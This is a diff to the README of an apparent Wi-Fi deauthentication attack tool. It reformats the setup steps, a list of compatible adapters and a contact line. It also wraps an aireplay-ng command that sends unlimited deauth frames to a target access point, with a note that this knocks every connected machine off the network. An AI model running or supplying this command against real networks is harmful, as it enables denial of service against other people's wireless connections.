@@ -88,13 +88,11 @@ git clone https://github.com/pirexkm01/wifi-attack-deauth.git
 ---
 
 
-```
-
----
+``
 
 # Give Execute Permission
 
-```bash
+``` bash
 chmod +x script.sh
 ```
 
@@ -181,7 +179,7 @@ sudo ./script.sh
 
 - Alfa AWUS036NHA
 - Alfa AWUS036ACH
-- TP-Link TL-WN722N v1
+- TP-Link TL-WN722N v1...
 
 ---
 
@@ -199,15 +197,15 @@ The author is not responsible for misuse.
 
 ---
 
-# Author
+# contact
 
 Instagram: @SIIR_PIREX
 
 ---
 
-# #attack deauth in c
+# attack deauth in c
 
-
+```bash
 sudo aireplay-ng --deauth 0 -a {bssid} {interface}
-
+```
  L0 --->  aut all machine  conecte in the wifi
